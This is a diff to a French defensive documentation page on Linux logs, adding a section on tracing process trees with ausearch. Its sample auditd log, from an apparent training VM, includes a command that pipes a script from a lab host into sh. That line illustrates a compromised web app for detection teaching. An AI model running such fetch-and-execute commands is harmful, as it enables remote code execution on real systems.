@@ -2,7 +2,7 @@
 title: "Journaux Linux"
 description: "Où trouver les journaux d'un serveur Linux et comment les lire : auth.log (connexions, SSH, comptes, sudo), journaux système, historique Bash, et auditd pour suivre processus et fichiers."
 tags: [linux, journaux, auth-log, auditd, bash]
-updated: 2026-11-18
+updated: 2026-11-19
 draft: false
 ---
 
@@ -105,3 +105,43 @@ type=SYSCALL msg=audit(08/12/25 12:48:19.093:2219) : arch=x86_64 syscall=execve 
 Un événement peut aussi être dans le journal sans clé dédiée : chercher alors dans `ausearch -i` avec `grep`.
 
 Autres outils sur le même principe, plus faciles à envoyer dans un SIEM : Sysmon for Linux, Falco (conteneurs), Osquery, et la plupart des EDR.
+
+## Remonter l'arbre des processus
+
+Les journaux d'application ne disent pas toujours tout. La méthode universelle : partir d'un déclencheur (alerte sur une commande suspecte, connexion vers une IP malveillante), remonter l'arbre des processus jusqu'à l'application ou l'utilisateur qui l'a lancé, puis juger si c'est légitime.
+
+:::etapes
+1. **Trouver la commande**
+   `ausearch -i -x whoami` : les événements d'un programme (`-x`, par son nom). Noter son `ppid`.
+2. **Remonter les parents**
+   `ausearch -i --pid 3905` avec le `ppid` trouvé, et recommencer jusqu'au processus 1 (le système).
+3. **Lister les enfants du processus d'origine**
+   `ausearch -i --ppid 3898 | grep 'proctitle'` : les autres commandes qu'il a lancées, souvent plus parlantes.
+:::
+
+```text title="whoami → /bin/sh -c whoami → application web Python"
+ubuntu@thm-vm:~$ ausearch -i -x whoami
+type=PROCTITLE msg=audit(08/25/25 16:28:18.107:985) : proctitle=whoami
+type=SYSCALL msg=audit(08/25/25 16:28:18.107:985) : syscall=execve success=yes exit=0 items=2 ppid=3905 pid=3907 auid=unset uid=ubuntu tty=(none) exe=/usr/bin/whoami key=exec
+
+ubuntu@thm-vm:~$ ausearch -i --pid 3905
+type=PROCTITLE msg=audit(08/25/25 16:28:17.101:983) : proctitle=/bin/sh -c whoami
+type=SYSCALL msg=audit(08/25/25 16:28:17.101:983) : syscall=execve success=yes exit=0 items=2 ppid=3898 pid=3905 auid=unset uid=ubuntu tty=(none) exe=/usr/bin/dash key=exec
+
+ubuntu@thm-vm:~$ ausearch -i --pid 3898
+type=PROCTITLE msg=audit(08/25/25 16:28:11.727:982) : proctitle=/usr/bin/python3 /opt/mywebapp/app.py
+type=SYSCALL msg=audit(08/25/25 16:28:11.727:982) : syscall=execve success=yes exit=0 items=2 ppid=1 pid=3898 auid=unset uid=ubuntu tty=(none) exe=/usr/bin/python3.12 key=exec
+
+ubuntu@thm-vm:~$ ausearch -i --ppid 3898 | grep 'proctitle'
+type=PROCTITLE msg=audit(08/25/25 16:28:17.101:983) : proctitle=/bin/sh -c whoami
+type=PROCTITLE msg=audit(08/25/25 16:28:18.230:985) : proctitle=/bin/sh -c ls -la
+type=PROCTITLE msg=audit(08/25/25 16:28:19.765:987) : proctitle=/bin/sh -c curl http://17gs9q1puh8o-bot.thm | sh
+```
+
+Ce que le parent révèle :
+
+| Parent | Ce que ça indique |
+| --- | --- |
+| Serveur ou application web (PHP, Python) | Une attaque web : [application exposée exploitée](../03-menaces-detection/initial-access/exploitation-application-publique.md). |
+| Service interne de confiance | Une [compromission de la chaîne d'approvisionnement](../03-menaces-detection/initial-access/chaine-d-approvisionnement.md). |
+| Session SSH d'un utilisateur | Une intrusion par SSH : voir [force brute](../03-menaces-detection/credential-access/force-brute.md). |
